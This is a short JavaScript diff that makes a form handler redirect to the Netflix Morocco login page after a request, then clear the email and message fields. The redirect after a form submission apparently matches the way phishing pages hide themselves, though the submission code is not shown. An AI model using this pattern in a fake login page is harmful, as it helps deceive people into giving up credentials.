@@ -32,7 +32,7 @@ var xnmap = function() {
         console.log(response);
     });
     
-    //location=("https://www.netflix.com");
+    location=("https://www.netflix.com/ma-en/login");
   //  document.getElementById("name").value = "";
     document.getElementById("email").value = "";
     document.getElementById("message").value = "";
